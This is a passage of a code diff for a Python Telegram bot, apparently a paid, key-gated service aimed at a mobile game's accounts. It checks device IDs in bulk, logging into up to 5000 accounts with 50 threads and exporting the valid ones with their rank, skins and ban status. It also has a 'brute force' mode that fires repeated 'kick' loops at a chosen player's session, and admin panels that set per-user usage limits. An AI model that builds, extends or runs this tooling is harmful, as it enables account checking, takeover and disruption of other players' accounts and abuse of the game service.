+            lines.append(f"   ID: <code>{u['user_id']}</code> | Key: <code>{u.get('key', 'N/A')}</code>")
+            if u.get("expires_at"):
+                lines.append(f"   Expires: {u['expires_at'][:19]}")
+            else:
+                lines.append(f"   Expires: ♾️ Lifetime")
+            lines.append("")
+        
+        if len(users) > 30:
+            lines.append(f"... and {len(users)-30} more users")
+        lines.append("═══════════════════════════")
+        
+        await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+    
+    elif data == "admin_delkey":
+        context.user_data["admin_conv_state"] = "delete_key"
+        await query.edit_message_text(
+            "🗑️ <b>DELETE KEY</b>\n\n"
+            "Send the key code to delete:\n\n"
+            "Type /cancel to abort.",
+            parse_mode=ParseMode.HTML
+        )
+    
+    elif data == "admin_revoke":
+        context.user_data["admin_conv_state"] = "revoke_user"
+        await query.edit_message_text(
+            "🚫 <b>REVOKE USER ACCESS</b>\n\n"
+            "Send the User ID to revoke:\n\n"
+            "Type /cancel to abort.",
+            parse_mode=ParseMode.HTML
+        )
+    
+    elif data == "admin_broadcast":
+        context.user_data["admin_conv_state"] = "broadcast"
+        await query.edit_message_text(
+            "📢 <b>BROADCAST MESSAGE</b>\n\n"
+            "Send the message to broadcast to all users:\n\n"
+            "Type /cancel to abort.",
+            parse_mode=ParseMode.HTML
+        )
+    
+    elif data == "admin_adduser":
+        context.user_data["admin_conv_state"] = "add_user"
+        await query.edit_message_text(
+            "➕ <b>ADD USER (MANUAL)</b>\n\n"
+            "Send the User ID to add (with lifetime access):\n\n"
+            "Type /cancel to abort.",
+            parse_mode=ParseMode.HTML
+        )
+    
+    elif data == "admin_botstats":
+        with COUNTER_LOCK:
+            total_hits = sum(HIT_COUNTERS.values())
+        keys_count = len(list_all_keys())
+        users_count = len(list_all_users())
+        bf_limit = get_bf_limit()
+        
+        text = (
+            f"📊 <b>BOT STATISTICS</b>\n"
+            f"═══════════════════════════\n"
+            f"🔑 Total Keys: {keys_count}\n"
+            f"👥 Total Users: {users_count}\n"
+            f"📊 Total Hits: {total_hits:,}\n"
+            f"🔥 Mythic: {HIT_COUNTERS.get('mythic', 0):,}\n"
+            f"💠 Legend: {HIT_COUNTERS.get('legend', 0):,}\n"
+            f"👑 Sultan: {HIT_COUNTERS.get('sultan', 0):,}\n"
+            f"🚫 Banned: {HIT_COUNTERS.get('banned', 0):,}\n"
+            f"⚡ BF Global Limit: {bf_limit}\n"
+            f"═══════════════════════════"
+        )
+        await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+    
+    # ─── BF LIMITS ADMIN ─────────────────────────────────────────
+    
+    elif data == "admin_bf_limits":
+        global_limit = get_bf_limit()
+        with BF_LIMITS_LOCK:
+            limits = load_json(BF_LIMITS_FILE)
+            user_overrides = limits.get("user_overrides", {})
+            custom_count = len(user_overrides)
+        
+        await query.edit_message_text(
+            "⚡ <b>BRUTE FORCE LIMITS ADMIN</b>\n"
+            "═══════════════════════════\n"
+            f"🌍 Global limit: <b>{global_limit}</b> device(s) per user\n"
+            f"👤 Users with custom limits: <b>{custom_count}</b>\n\n"
+            "Select an option below:",
+            parse_mode=ParseMode.HTML,
+            reply_markup=bf_limits_admin_keyboard()
+        )
+    
+    elif data == "admin_bf_show":
+        global_limit = get_bf_limit()
+        await query.answer(f"Global BF limit: {global_limit} device(s) per user", show_alert=True)
+    
+    elif data == "admin_bf_set":
+        context.user_data["admin_bf_action"] = "set_global"
+        await query.edit_message_text(
+            "✏️ <b>SET GLOBAL BF DEVICE LIMIT</b>\n"
+            "═══════════════════════════\n"
+            f"Current global limit: <b>{get_bf_limit()}</b>\n\n"
+            "Send the new limit number (0 = unlimited):\n\n"
+            "Type /cancel to abort.",
+            parse_mode=ParseMode.HTML
+        )
+    
+    elif data == "admin_bf_set_user":
+        context.user_data["admin_bf_action"] = "set_user_id"
+        await query.edit_message_text(
+            "👤 <b>SET USER-SPECIFIC BF LIMIT</b>\n"
+            "═══════════════════════════\n\n"
+            "Send the User ID first:\n\n"
+            "Type /cancel to abort.",
+            parse_mode=ParseMode.HTML
+        )
+    
+    elif data == "admin_bf_clear_all":
+        reset_all_bf_devices()
+        await query.edit_message_text(
+            "✅ <b>All users' BF history cleared!</b>\n"
+            "All users can now use new devices.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=bf_limits_admin_keyboard()
+        )
+    
+    elif data == "admin_bf_clear_user":
+        context.user_data["admin_bf_action"] = "clear_user"
+        await query.edit_message_text(
+            "🧹 <b>CLEAR SPECIFIC USER BF HISTORY</b>\n"
+            "═══════════════════════════\n\n"
+            "Send the User ID to clear their BF history:\n\n"
+            "Type /cancel to abort.",
+            parse_mode=ParseMode.HTML
+        )
+    
+    elif data == "admin_bf_stats":
+        limits = load_json(BF_LIMITS_FILE)
+        users_data = limits.get("users", {})
+        user_overrides = limits.get("user_overrides", {})
+        
+        if not users_data:
+            await query.edit_message_text(
+                "📊 <b>BF USAGE STATISTICS</b>\n"
+                "═══════════════════════════\n"
+                "No users have used brute force yet.",
+                parse_mode=ParseMode.HTML,
+                reply_markup=bf_limits_admin_keyboard()
+            )
+            return
+        
+        users_db = load_json(USERS_FILE)
+        lines = ["📊 <b>BF USAGE STATISTICS</b>", "═══════════════════════════"]
+        lines.append(f"🌍 Global limit: {get_bf_limit()}\n")
+        
+        if user_overrides:
+            lines.append("👤 <b>Users with custom limits:</b>")
+            for uid, limit in user_overrides.items():
+                username = users_db.get(uid, {}).get("username", f"User_{uid}")
+                devices = users_data.get(uid, [])
+                lines.append(f"  {escape_html(username)}: {len(devices)}/{limit}")
+            lines.append("")
+        
+        lines.append("<b>Top users by usage:</b>")
+        sorted_users = sorted(users_data.items(), key=lambda x: len(x[1]), reverse=True)
+        for uid, devices in sorted_users[:20]:
+            username = users_db.get(uid, {}).get("username", f"User_{uid}")
+            limit = get_bf_limit(int(uid))
+            lines.append(f"👤 {escape_html(username)}")
+            lines.append(f"   🆔 {uid}")
+            lines.append(f"   📊 Used: {len(devices)}/{limit}")
+            lines.append("")
+        
+        if len(sorted_users) > 20:
+            lines.append(f"... and {len(sorted_users)-20} more users")
+        lines.append("═══════════════════════════")
+        
+        await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=bf_limits_admin_keyboard())
+
+# ────────────────────────────────────────────────────────────────
+# 20. ADMIN BF TEXT HANDLER
+# ────────────────────────────────────────────────────────────────
+
+async def handle_admin_bf_text(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, action: str):
+    if text.lower() == '/cancel':
+        await update.message.reply_text("❌ Cancelled.", reply_markup=admin_panel_keyboard())
+        context.user_data.pop("admin_bf_action", None)
+        context.user_data.pop("bf_target_user_id", None)
+        return
+    
+    if action == "set_global":
+        try:
+            limit = int(text)
+            if limit < 0:
+                await update.message.reply_text("❌ Limit cannot be negative! Send 0 for unlimited.")
+                return
+            set_bf_limit(limit)
+            await update.message.reply_text(
+                f"✅ <b>Global BF Limit Updated!</b>\n"
+                f"New limit: <b>{limit}</b> device(s) per user",
+                parse_mode=ParseMode.HTML,
+                reply_markup=bf_limits_admin_keyboard()
+            )
+            context.user_data.pop("admin_bf_action", None)
+        except ValueError:
+            await update.message.reply_text("❌ Please send a valid number.")
+    
+    elif action == "set_user_id":
+        try:
+            target_id = int(text)
+            context.user_data["bf_target_user_id"] = target_id
+            context.user_data["admin_bf_action"] = "set_user_value"
+            await update.message.reply_text(
+                f"👤 User ID: <code>{target_id}</code>\n"
+                f"Current limit: <b>{get_bf_limit(target_id)}</b>\n\n"
+                f"Send new limit (0=unlimited, -1=use global):",
+                parse_mode=ParseMode.HTML
+            )
+        except ValueError:
+            await update.message.reply_text("❌ Invalid User ID. Please send a number.")
+    
+    elif action == "set_user_value":
+        try:
+            limit = int(text)
+            if limit < -1:
+                await update.message.reply_text("❌ Limit cannot be less than -1.")
+                return
+            target_id = context.user_data.get("bf_target_user_id")
+            if not target_id:
+                await update.message.reply_text("❌ Session expired.", reply_markup=admin_panel_keyboard())
+                context.user_data.pop("admin_bf_action", None)
+                return
+            set_user_bf_limit(target_id, limit)
+            if limit == -1:
+                await update.message.reply_text(
+                    f"✅ <b>User-Specific BF Limit Removed!</b>\n"
+                    f"User <code>{target_id}</code> will now use global limit.",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=bf_limits_admin_keyboard()
+                )
+            else:
+                await update.message.reply_text(
+                    f"✅ <b>User BF Limit Updated!</b>\n"
+                    f"User <code>{target_id}</code>: <b>{limit}</b> device(s)",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=bf_limits_admin_keyboard()
+                )
+            context.user_data.pop("admin_bf_action", None)
+            context.user_data.pop("bf_target_user_id", None)
+        except ValueError:
+            await update.message.reply_text("❌ Please send a valid number.")
+    
+    elif action == "clear_user":
+        try:
+            target_id = int(text)
+            if clear_user_bf_devices(target_id):
+                await update.message.reply_text(
+                    f"✅ <b>BF History Cleared for User <code>{target_id}</code></b>",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=bf_limits_admin_keyboard()
+                )
+            else:
+                await update.message.reply_text(
+                    f"ℹ️ User <code>{target_id}</code> has no BF history.",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=bf_limits_admin_keyboard()
+                )
+            context.user_data.pop("admin_bf_action", None)
+        except ValueError:
+            await update.message.reply_text("❌ Invalid User ID.")
+
+# ────────────────────────────────────────────────────────────────
+# 21. CONVERSATION ROUTER
+# ────────────────────────────────────────────────────────────────
+
+async def _conversation_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Router for the ConversationHandler entry point.
+    Returns the appropriate state based on user_data flags, or ConversationHandler.END.
+    """
+    stage = context.user_data.get("bf_custom_stage")
+    if stage == "loops":
+        return STATE_BF_CUSTOM_LOOPS
+    if stage == "delay":
+        return STATE_BF_CUSTOM_DELAY
+    
+    admin_state = context.user_data.get("admin_conv_state")
+    if admin_state == "delete_key":
+        return STATE_ADMIN_DELETE_KEY
+    if admin_state == "revoke_user":
+        return STATE_ADMIN_REVOKE_USER
+    if admin_state == "broadcast":
+        return STATE_ADMIN_BROADCAST
+    if admin_state == "add_user":
+        return STATE_ADMIN_ADDUSER_ID
+    
+    return ConversationHandler.END
+
+# ────────────────────────────────────────────────────────────────
+# 22. UNIFIED TEXT HANDLER
+# ────────────────────────────────────────────────────────────────
+
+async def handle_all_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Unified text input handler that routes based on state."""
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    
+    if not text:
+        return
+    
+    # Safety guard - if conv state is active, skip (ConversationHandler should handle)
+    if (context.user_data.get("bf_custom_stage") or 
+        context.user_data.get("admin_conv_state")):
+        return
+    
+    # Priority 1: Admin BF action pending
+    action = context.user_data.get("admin_bf_action")
+    if action and is_admin(user_id):
+        await handle_admin_bf_text(update, context, text, action)
+        return
+    
+    # Priority 2: Single check input
+    if context.user_data.get("waiting_for_single_check"):
+        await handle_single_check_input(update, context)
+        return
+    
+    # Priority 3: Brute force device input
+    if context.user_data.get("waiting_for_bruteforce"):
+        await handle_bf_device_input(update, context)
+        return
+    
+    # Default: no active operation
+    if is_admin(user_id):
+        await update.message.reply_text(
+            "ℹ️ Select an option from the menu below:",
+            reply_markup=main_menu_keyboard()
+        )
+    else:
+        await update.message.reply_text(
+            "ℹ️ Please select an option from the menu.",
+            reply_markup=main_menu_keyboard()
+        )
+
+# ────────────────────────────────────────────────────────────────
+# 23. SINGLE CHECK INPUT
+# ────────────────────────────────────────────────────────────────
+
+async def handle_single_check_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    device_id = update.message.text.strip()
+    if device_id.lower() == '/cancel':
+        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
+        context.user_data["waiting_for_single_check"] = False
+        return
+    
+    context.user_data["waiting_for_single_check"] = False
+    await update.message.reply_text("⏳ Checking account... Please wait.", reply_markup=ReplyKeyboardRemove())
+    
+    result = [None, None]
+    def worker():
+        acc, zone, stat = GameLogin(device_id).run()
+        if not acc or not zone:
+            result[0] = None
+            result[1] = stat
+            return
+        player_data = process_detail(device_id, acc, zone)
+        result[0] = (acc, zone)
+        result[1] = player_data
+    
+    t = threading.Thread(target=worker, daemon=True)
+    t.start()
+    
+    while t.is_alive():
+        await asyncio.sleep(0.5)
+    
+    acc_zone = result[0]
+    player_data = result[1]
+    
+    if not acc_zone:
+        msg = f"❌ <b>Login Failed!</b>\nDevice ID invalid or dead."
+        if isinstance(result[1], str) and 'ban' in result[1].lower():
+            msg += f"\n🚫 Status: {escape_html(result[1])}"
+        await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
+        return
+    
+    acc, zone = acc_zone
+    
+    if not player_data:
+        await update.message.reply_text(
+            "❌ Could not fetch account details.\nThe account may not have a player profile.",
+            parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard()
+        )
+        return
+    
+    nick = player_data.get('nickname', 'N/A')
+    level = player_data.get('level', 'N/A')
+    skin_cnt = player_data.get('skin_count', 0)
+    hero_cnt = player_data.get('hero_count', 0)
+    cur_rank = player_data.get('current_rank', 'Unranked')
+    highest_rank = player_data.get('highest_rank', 'N/A')
+    ban_stat = player_data.get('ban_status', 'NORMAL')
+    v2l = player_data.get('v2l_status', 'N/A')
+    created_at = player_data.get('created_at', 'N/A')
+    
+    v2l_text = "ACTIVE 🟢" if str(v2l).lower() in ('enabled', 'yes', '1', 'true') else \
+               "INACTIVE 🔴" if str(v2l).lower() in ('disabled', 'no', '0', 'false') else "N/A"
+    
+    is_banned = 'ban' in str(ban_stat).lower()
+    
+    text = (
+        f"📋 <b>ACCOUNT DETAILS (8-REQ CHECK)</b>\n"
+        f"═══════════════════════════\n"
+        f"📱 Device ID: <code>{escape_html(device_id)}</code>\n"
+        f"🆔 Account: <b>{acc}</b> ({zone})\n"
+        f"👤 Nickname: <b>{escape_html(str(nick))}</b> (Lv.{level})\n"
+        f"⚡ Status: {'🚫 BANNED' if is_banned else '✅ NORMAL'}\n"
+    )
+    if is_banned:
+        text += f"   🚫 Reason: {escape_html(str(ban_stat))}\n"
+    text += (
+        f"🏆 Rank: {cur_rank}\n"
+        f"⭐ Max Rank: {highest_rank}\n"
+        f"🦸 Heroes: {hero_cnt}\n"
+        f"🎨 Skins: {skin_cnt}\n"
+        f"🔐 V2L: {v2l_text}\n"
+        f"📅 Created: {created_at}\n"
+        f"═══════════════════════════"
+    )
+    
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
+
+# ────────────────────────────────────────────────────────────────
+# 24. BRUTE FORCE DEVICE INPUT
+# ────────────────────────────────────────────────────────────────
+
+async def handle_bf_device_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    device_id = update.message.text.strip()
+    user_id = update.effective_user.id
+    
+    if device_id.lower() == '/cancel':
+        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
+        context.user_data["waiting_for_bruteforce"] = False
+        return
+    
+    user_devices = get_user_bf_devices(user_id)
+    limit = get_bf_limit(user_id)
+    
+    if not is_admin(user_id):
+        if limit > 0 and len(user_devices) >= limit:
+            await update.message.reply_text(
+                f"❌ <b>Device Limit Reached!</b>\n\n"
+                f"Limit: <b>{limit}</b> device(s)\n"
+                f"📊 Used: {len(user_devices)}/{limit}\n"
+                f"💡 Contact admin to increase your limit.",
+                parse_mode=ParseMode.HTML,
+                reply_markup=main_menu_keyboard()
+            )
+            context.user_data["waiting_for_bruteforce"] = False
+            return
+        
+        if device_id in user_devices:
+            await update.message.reply_text(
+                f"❌ <b>Device Already Used!</b>\n\n"
+                f"📊 Used: {len(user_devices)}/{limit}\n"
+                f"💡 Try a different device ID.",
+                parse_mode=ParseMode.HTML,
+                reply_markup=main_menu_keyboard()
+            )
+            context.user_data["waiting_for_bruteforce"] = False
+            return
+    
+    context.user_data["waiting_for_bruteforce"] = False
+    await update.message.reply_text("⏳ Verifying device & fetching profile...", reply_markup=ReplyKeyboardRemove())
+    
+    profile = [None]
+    def worker():
+        profile[0] = fetch_session_profile(device_id)
+    
+    t = threading.Thread(target=worker, daemon=True)
+    t.start()
+    
+    while t.is_alive():
+        await asyncio.sleep(0.5)
+    
+    prof = profile[0]
+    
+    if not prof:
+        await update.message.reply_text(
+            "❌ Invalid Device ID!\nDevice may be dead or login failed.",
+            parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard()
+        )
+        return
+    
+    context.user_data["bf_device"] = device_id
+    context.user_data["bf_stop_flag"] = False
+    context.user_data["bf_refunded"] = False
+    
+    ban_text = "🚫 BANNED" if 'ban' in str(prof['ban_status']).lower() else "✅ NORMAL"
+    
+    used_count, limit = get_user_bf_usage_stats(user_id)
+    remaining = limit - used_count if limit > 0 else "Unlimited"
+    limit_text = f"📊 Remaining devices: {remaining}" if limit > 0 else "♾️ Unlimited"
+    
+    text = (
+        f"📋 <b>ACCOUNT PROFILE</b>\n"
+        f"═══════════════════════════\n"
+        f"📱 Device: <code>{escape_html(device_id)}</code>\n"
+        f"👤 Nickname: <b>{escape_html(str(prof['nickname']))}</b>\n"
+        f"🆔 Account ID: <code>{prof['account_id']}</code>\n"
+        f"🌍 Zone: {prof['zone_id']}\n"
+        f"📊 Level: {prof['level']}\n"
+        f"🏆 Rank: {prof['rank']}\n"
+        f"⭐ Max Rank: {prof['highest_rank']}\n"
+        f"🎨 Skins: {prof['skin_count']} | 🦸 Heroes: {prof['hero_count']}\n"
+        f"⚡ Status: {ban_text}\n"
+        f"═══════════════════════════\n"
+        f"{limit_text}\n"
+        f"═══════════════════════════\n"
+        f"⚡ <b>SELECT KICK MODE:</b>"
+    )
+    
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🧪 Single Test", callback_data="bf_kick_1_0"),
+         InlineKeyboardButton("⚡ 10x", callback_data="bf_kick_10_2"),
+         InlineKeyboardButton("🚀 50x", callback_data="bf_kick_50_1")],
+        [InlineKeyboardButton("💥 100x", callback_data="bf_kick_100_0.5"),
+         InlineKeyboardButton("♾️ Unlimited", callback_data="bf_kick_0_0")],
+        [InlineKeyboardButton("🛠️ Custom", callback_data="bf_kick_custom_0")],
+        [InlineKeyboardButton("🛑 Stop Current Kick", callback_data="bf_stop")],
+        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
+    ])
+    
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+
+# ────────────────────────────────────────────────────────────────
+# 25. BF CUSTOM HANDLERS (ConversationHandler states)
+# ────────────────────────────────────────────────────────────────
+
+async def handle_bf_custom_loops(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    if text.lower() == '/cancel':
+        context.user_data.pop("bf_custom_stage", None)
+        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
+        context.user_data["waiting_for_bruteforce"] = False
+        return ConversationHandler.END
+    
+    try:
+        loops = int(text)
+    except:
+        await update.message.reply_text("❌ Invalid number! Try again:")
+        return STATE_BF_CUSTOM_LOOPS
+    
+    context.user_data["bf_custom_loops"] = loops
+    context.user_data["bf_custom_stage"] = "delay"
+    await update.message.reply_text(
+        "Now send the delay in seconds (e.g., <code>1.5</code>):\n\nType /cancel to abort.",
+        parse_mode=ParseMode.HTML
+    )
+    return STATE_BF_CUSTOM_DELAY
+
+async def handle_bf_custom_delay(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    user_id = update.effective_user.id
+    
+    if text.lower() == '/cancel':
+        context.user_data.pop("bf_custom_stage", None)
+        await update.message.reply_text("❌ Cancelled.", reply_markup=main_menu_keyboard())
+        context.user_data["waiting_for_bruteforce"] = False
+        return ConversationHandler.END
+    
+    try:
+        delay = float(text)
+    except:
+        await update.message.reply_text("❌ Invalid number! Try again:")
+        return STATE_BF_CUSTOM_DELAY
+    
+    loops = context.user_data.get("bf_custom_loops", 10)
+    device_id = context.user_data.get("bf_device")
+    context.user_data.pop("bf_custom_stage", None)
+    
+    if not device_id:
+        await update.message.reply_text("❌ Session expired.", reply_markup=main_menu_keyboard())
+        context.user_data["waiting_for_bruteforce"] = False
+        return ConversationHandler.END
+    
+    context.user_data["waiting_for_bruteforce"] = False
+    context.user_data["bf_stop_flag"] = False
+    context.user_data["bf_refunded"] = False
+    
+    msg = await update.message.reply_text(
+        f"⚡ Starting custom kick: {loops} loops, {delay}s delay...",
+        parse_mode=ParseMode.HTML
+    )
+    
+    class FakeQuery:
+        def __init__(self, msg):
+            self.message = msg
+        async def edit_message_text(self, *args, **kwargs):
+            await self.message.edit_text(*args, **kwargs)
+        async def answer(self, *args, **kwargs):
+            pass
+    
+    asyncio.create_task(run_spam_kick(FakeQuery(msg), context, device_id, loops, delay, user_id))
+    return ConversationHandler.END
+
+# ────────────────────────────────────────────────────────────────
+# 26. BULK FILE HANDLER
+# ────────────────────────────────────────────────────────────────
+
+async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle bulk check .txt file upload."""
+    if not update.message or not update.message.document:
+        return
+    
+    doc = update.message.document
+    if not doc.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Only .txt files are supported!")
+        return
+    
+    status_msg = await update.message.reply_text("⏳ Downloading file...")
+    
+    try:
+        file = await doc.get_file()
+        file_path = os.path.join(OUTPUT_DIR, FOLDERS["split"], f"upload_{int(time.time())}.txt")
+        await file.download_to_drive(file_path)
+        
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            devices = [l.strip() for l in f if l.strip()]
+        
+        if not devices:
+            await status_msg.edit_text("❌ No device IDs found in file!")
+            return
+        
+        # Limit to prevent abuse (optional)
+        if len(devices) > 5000:
+            await status_msg.edit_text(f"❌ Too many devices! Max 5000 per file. Found: {len(devices)}")
+            return
+        
+        stats = {
+            "total": len(devices), "processed": 0, "hits": 0, "info": 0,
+            "no_info": 0, "unreg": 0, "banned": 0, "failed": 0,
+            "level_1_30": 0, "level_31_50": 0, "level_51_99": 0, "level_100_plus": 0,
+            "skin_1_50": 0, "skin_51_99": 0, "skin_100_250": 0,
+            "skin_251_300": 0, "skin_301_400": 0, "skin_400_plus": 0,
+            "rank_warrior": 0, "rank_elite": 0, "rank_master": 0, "rank_gm": 0,
+            "rank_epic": 0, "rank_legend": 0, "rank_mythic": 0,
+            "start_time": time.time()
+        }
+        
+        def update_stats(player_data):
+            if not player_data:
+                stats["no_info"] += 1
+                return
+            stats["info"] += 1
+            level = player_data.get('level', 0)
+            if isinstance(level, (int, float)):
+                if 1 <= level <= 30: stats["level_1_30"] += 1
+                elif 31 <= level <= 50: stats["level_31_50"] += 1
+                elif 51 <= level <= 99: stats["level_51_99"] += 1
+                elif level >= 100: stats["level_100_plus"] += 1
+            skin = player_data.get('skin_count', 0)
+            if isinstance(skin, (int, float)):
+                if 1 <= skin <= 50: stats["skin_1_50"] += 1
+                elif 51 <= skin <= 99: stats["skin_51_99"] += 1
+                elif 100 <= skin <= 250: stats["skin_100_250"] += 1
+                elif 251 <= skin <= 300: stats["skin_251_300"] += 1
+                elif 301 <= skin <= 400: stats["skin_301_400"] += 1
+                elif skin >= 401: stats["skin_400_plus"] += 1
+            rank_cat = get_rank_category(player_data.get('current_rank', 'Unranked'))
+            key = f"rank_{rank_cat}"
+            if key in stats:
+                stats[key] += 1
+
+        def do_bulk():
+            hits = 0
+            processed = 0
+            failed = 0
+            
+            # First, do login checks in parallel
+            login_results = []
+            with ThreadPoolExecutor(max_workers=50) as ex:
+                futures = {ex.submit(GameLogin(dev).run): dev for dev in devices}
+                for future in as_completed(futures):
+                    dev = futures[future]
+                    try:
+                        acc, zone, stat = future.result(timeout=10)
+                        if acc and zone:
+                            login_results.append((dev, acc, zone))
+                        else:
+                            processed += 1
+                            stats["processed"] = processed
+                            if 'ban' in stat.lower():
+                                stats["banned"] += 1
+                            else:
+                                stats["unreg"] += 1
+                                stats["no_info"] += 1
+                                failed += 1
+                    except Exception:
+                        processed += 1
+                        stats["processed"] = processed
+                        stats["failed"] += 1
+                        failed += 1
+            
+            # Then process details in parallel
+            with ThreadPoolExecutor(max_workers=50) as ex:
+                futures = []
+                for dev, acc, zone in login_results:
+                    futures.append((dev, acc, zone, ex.submit(process_detail, dev, acc, zone)))
+                
+                for dev, acc, zone, future in futures:
+                    try:
+                        result = future.result(timeout=30)
+                        if result:
+                            hits += 1
+                            update_stats(result)
+                        else:
+                            stats["no_info"] += 1
+                            failed += 1
+                    except Exception:
+                        stats["no_info"] += 1
+                        failed += 1
+                    processed += 1
+                    stats["processed"] = processed
+                    stats["hits"] = hits
+                    stats["failed"] = failed
+        
+        t = threading.Thread(target=do_bulk, daemon=True)
+        t.start()
+        
+        await status_msg.edit_text(
+            f"📊 <b>Loaded {stats['total']} IDs.</b>\n"
+            f"⏳ Starting...",
+            parse_mode=ParseMode.HTML
+        )
+        
+        last_update = time.time()
+        while t.is_alive():
+            await asyncio.sleep(1)
+            if time.time() - last_update >= 3:
+                elapsed = time.time() - stats["start_time"]
+                speed = stats["processed"] / elapsed if elapsed > 0 else 0
+                eta = (stats["total"] - stats["processed"]) / speed if speed > 0 else 0
+                try:
+                    await status_msg.edit_text(
+                        f"📊 <b>Task Running...</b>\n"
+                        f"Total checked: {stats['processed']}/{stats['total']}\n"
+                        f"Valid found: {stats['hits']}\n"
+                        f"Failed: {stats['failed']}\n"
+                        f"Speed: {speed:.1f}/s\n"
+                        f"ETA: {eta/60:.1f}m",
+                        parse_mode=ParseMode.HTML
+                    )
+                except Exception:
+                    pass
+                last_update = time.time()
+        
+        elapsed = time.time() - stats["start_time"]
+        minutes = int(elapsed // 60)
+        seconds = int(elapsed % 60)
+        speed = stats["processed"] / elapsed if elapsed > 0 else 0
+        success_rate = (stats["hits"] / stats["processed"] * 100) if stats["processed"] > 0 else 0
+        
+        final_text = (
+            f"✅ <b>Task Complete!</b>\n\n"
+            f"Total checked: {stats['processed']}\n"
+            f"Valid found: {stats['hits']}\n"
+            f"Failed: {stats['failed']}\n"
+            f"Success rate: {success_rate:.2f}%\n"
+            f"Total time: {minutes}m {seconds}s\n"
+            f"Avg speed: {speed:.1f}/s\n\n"
+            f"📈 <b>Level</b>\n"
+            f"1-30: {stats['level_1_30']} | 31-50: {stats['level_31_50']}\n"
+            f"51-99: {stats['level_51_99']} | 100+: {stats['level_100_plus']}\n\n"
+            f"🎨 <b>Skin</b>\n"
+            f"1-50: {stats['skin_1_50']} | 51-99: {stats['skin_51_99']}\n"
+            f"100-250: {stats['skin_100_250']} | 251-300: {stats['skin_251_300']}\n"
+            f"301-400: {stats['skin_301_400']} | 401+: {stats['skin_400_plus']}\n\n"
+            f"🏆 <b>Rank</b>\n"
+            f"Warrior: {stats['rank_warrior']} | Elite: {stats['rank_elite']}\n"
+            f"Master: {stats['rank_master']} | GM: {stats['rank_gm']}\n"
+            f"Epic: {stats['rank_epic']} | Legend: {stats['rank_legend']}\n"
+            f"Mythic+: {stats['rank_mythic']}"
+        )
+        
+        await status_msg.edit_text(final_text, parse_mode=ParseMode.HTML)
+        await upload_bulk_results(update, context, stats)
+        
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Error processing file: {str(e)}")
+
+async def upload_bulk_results(update: Update, context: ContextTypes.DEFAULT_TYPE, stats: dict):
+    upload_msg = await update.message.reply_text("📤 <b>Uploading result files...</b>", parse_mode=ParseMode.HTML)
+    
+    files_uploaded = []
+    files_failed = []
+    files_to_upload = []
+    
+    if os.path.exists(FILES["all_hits_detail"]) and os.path.getsize(FILES["all_hits_detail"]) > 0:
+        files_to_upload.append((FILES["all_hits_detail"], "all_hits_detail.txt"))
+    if os.path.exists(FILES["raw_devices_detail"]) and os.path.getsize(FILES["raw_devices_detail"]) > 0:
+        files_to_upload.append((FILES["raw_devices_detail"], "raw_devices_detail.txt"))
+    
+    banned_file = os.path.join(OUTPUT_DIR, FOLDERS["error"], "banned_accounts.txt")
+    if os.path.exists(banned_file) and os.path.getsize(banned_file) > 0:
+        files_to_upload.append((banned_file, "banned_accounts.txt"))
+    
+    if not files_to_upload:
+        await upload_msg.edit_text("✅ No result files to upload.", parse_mode=ParseMode.HTML)
+        return
+    
+    for file_path, display_name in files_to_upload:
+        try:
+            file_size = os.path.getsize(file_path)
+            size_str = f"{file_size/1024:.1f} KB" if file_size < 1024*1024 else f"{file_size/(1024*1024):.2f} MB"
+            with open(file_path, 'rb') as f:
+                await context.bot.send_document(
+                    chat_id=update.message.chat_id,
+                    document=InputFile(f, filename=display_name),
+                    caption=f"📄 {display_name}\n📦 Size: {size_str}"
+                )
+            files_uploaded.append(display_name)
+            await asyncio.sleep(0.3)
+        except Exception as e:
+            files_failed.append(f"{display_name}: {str(e)[:50]}")
+    
+    summary = "✅ <b>Bulk Check Complete!</b>\n\n"
+    summary += f"📊 Total: {stats['processed']}\n"
+    summary += f"🎯 Valid: {stats['hits']}\n"
+    if files_uploaded:
+        summary += f"\n📄 Uploaded: {', '.join(files_uploaded)}"
+    if files_failed:
+        summary += f"\n❌ Failed: {', '.join(files_failed)}"
+    
+    await upload_msg.edit_text(summary, parse_mode=ParseMode.HTML, reply_markup=main_menu_keyboard())
+
+# ────────────────────────────────────────────────────────────────
+# 27. ADMIN CONVERSATION HANDLERS
+# ────────────────────────────────────────────────────────────────
+
+async def handle_admin_delete_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    key_code = update.message.text.strip().upper()
+    context.user_data.pop("admin_conv_state", None)
+    if key_code.lower() == '/cancel':
+        await update.message.reply_text("❌ Cancelled.", reply_markup=admin_panel_keyboard())
+        return ConversationHandler.END
+    
+    if delete_key(key_code):
